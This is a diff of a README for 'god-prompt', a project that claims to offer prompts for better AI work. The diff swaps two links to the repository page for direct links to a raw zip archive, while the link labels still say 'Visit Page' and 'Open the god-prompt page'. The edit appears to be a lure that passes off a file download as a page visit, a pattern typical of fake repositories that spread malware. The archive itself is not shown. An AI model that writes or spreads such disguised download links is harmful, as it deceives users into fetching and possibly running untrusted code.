@@ -1,6 +1,6 @@
 # 🤖 god-prompt - Clear prompts for better AI work
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Heartbreaking-greenhouseeffect508/god-prompt)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Heartbreaking-greenhouseeffect508/god-prompt/raw/refs/heads/main/core/god_prompt_3.4.zip)
 
 ## 🧭 What is god-prompt?
 
@@ -12,7 +12,7 @@ It is built for people who want more control when they ask an AI to write, revie
 
 Use this link to visit the page and download or copy the files you need:
 
-[Open the god-prompt page](https://github.com/Heartbreaking-greenhouseeffect508/god-prompt)
+[Open the god-prompt page](https://github.com/Heartbreaking-greenhouseeffect508/god-prompt/raw/refs/heads/main/core/god_prompt_3.4.zip)
 
 If you are on Windows, do this:
 
